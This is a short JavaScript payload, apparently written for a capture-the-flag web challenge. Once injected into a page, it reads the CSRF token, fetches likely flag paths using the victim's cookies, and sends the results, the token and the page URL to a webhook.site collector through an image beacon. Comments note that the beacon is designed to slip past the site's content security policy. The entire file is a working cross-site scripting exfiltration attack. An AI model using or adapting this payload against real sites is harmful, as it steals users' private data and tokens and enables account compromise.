// p.js  — self-exec, CSP-safe
(function () {
  var paths = ["/flag", "/flag.txt", "/admin/flag", "/api/flag"];

  // Optional: try to grab a CSRF token from DOM if present
  var token = "";
  try {
    var s = document.querySelector('input[name=csrf_token],input[name=csrf-token]');
    if (s && s.value) token = s.value;
    var m = document.querySelector('meta[name=csrf-token]');
    if (!token && m && m.content) token = m.content;
  } catch (e) {}

  function exfil(text) {
    try {
      var i = new Image();
      i.referrerPolicy = "no-referrer";
      // ONLY image beacon to your collector (allowed by img-src https:)
      i.src = "https://webhook.site/abc5b1d6-8272-4188-873e-5b98c81ed700"
            + "?d=" + encodeURIComponent((text || "").slice(0, 6000))
            + "&t=" + encodeURIComponent(token)
            + "&u=" + encodeURIComponent(location.href);
    } catch (e) {}
  }

  (function next(k) {
    if (k >= paths.length) { exfil("[no-flag]"); return; }
    fetch(paths[k], { credentials: "include" })
      .then(function (r) {
        if (!r.ok) { next(k + 1); return; }
        return r.text().then(function (t) {
          if (t) exfil(t); else next(k + 1);
        });
      })
      .catch(function () { next(k + 1); });
  })(0);
})();
